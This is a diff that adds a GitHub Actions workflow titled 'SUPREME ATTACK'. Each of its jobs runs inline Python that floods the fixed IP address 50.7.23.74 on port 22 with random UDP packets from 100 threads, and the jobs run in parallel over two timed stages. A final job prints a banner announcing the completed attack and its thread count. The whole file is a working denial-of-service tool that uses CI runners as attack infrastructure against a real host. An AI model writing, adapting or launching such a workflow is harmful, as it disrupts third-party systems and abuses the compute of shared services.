@@ -1,0 +1,97 @@
+name: ☠️ SUPREME ATTACK
+
+on:
+  workflow_dispatch:
+
+jobs:
+  # ═══════════════ STAGE 0: INITIAL BURST ═══════════════
+  stage-0:
+    name: "⚡ INIT"
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 256
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10]
+    steps:
+      - uses: actions/checkout@v4
+      - name: "🔥 Initial Burst 10s"
+        run: |
+          python3 -c "
+          import socket,os,time,random,threading
+          t='50.7.23.74';p=22
+          def f():
+              s=[]
+              for _ in range(25):
+                  try:
+                      sk=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+                      sk.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+                      sk.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,8*1024*1024)
+                      sk.setblocking(0);s.append(sk)
+                  except:pass
+              if not s:return
+              a=(t,p);pl=[os.urandom(random.randint(1,1400)) for _ in range(30)];e=time.time()+10
+              while time.time()<e:
+                  for sk in s:
+                      try:
+                          for _ in range(80):sk.sendto(random.choice(pl),a)
+                      except:pass
+          [threading.Thread(target=f,daemon=True).start() for _ in range(100)]
+          time.sleep(15)
+          print('✅ Done')
+          "
+
+  # ═══════════════ STAGE 1: MAIN ATTACK 60s ═══════════════
+  stage-1:
+    name: "💀 MAIN 60s"
+    needs: stage-0
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 256
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10]
+    steps:
+      - uses: actions/checkout@v4
+      - name: "🔥 MAIN ATTACK 60s"
+        run: |
+          python3 -c "
+          import socket,os,time,random,threading
+          t='50.7.23.74';p=22
+          def f():
+              s=[]
+              for _ in range(25):
+                  try:
+                      sk=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+                      sk.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+                      sk.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,8*1024*1024)
+                      sk.setblocking(0);s.append(sk)
+                  except:pass
+              if not s:return
+              a=(t,p);pl=[os.urandom(random.randint(1,1400)) for _ in range(30)];e=time.time()+60
+              while time.time()<e:
+                  for sk in s:
+                      try:
+                          for _ in range(80):sk.sendto(random.choice(pl),a)
+                      except:pass
+          [threading.Thread(target=f,daemon=True).start() for _ in range(100)]
+          time.sleep(65)
+          print('✅ 60s Attack Done')
+          "
+  
+  # ═══════════════ CLEANUP ═══════════════
+  cleanup:
+    name: "📊 DONE"
+    needs: [stage-1]
+    runs-on: ubuntu-latest
+    if: always()
+    steps:
+      - run: |
+          echo "╔══════════════════════════════════════╗"
+          echo "║   ☠️ ATTACK COMPLETED               ║"
+          echo "║   Target: 50.7.23.74:22             ║"
+          echo "║   Duration: 60s                     ║"
+          echo "║   Jobs: 20 (10+10)                  ║"
+          echo "║   Threads: 2000 total               ║"
+          echo "║   Time: $(date)                     ║"
+          echo "╚══════════════════════════════════════╝"
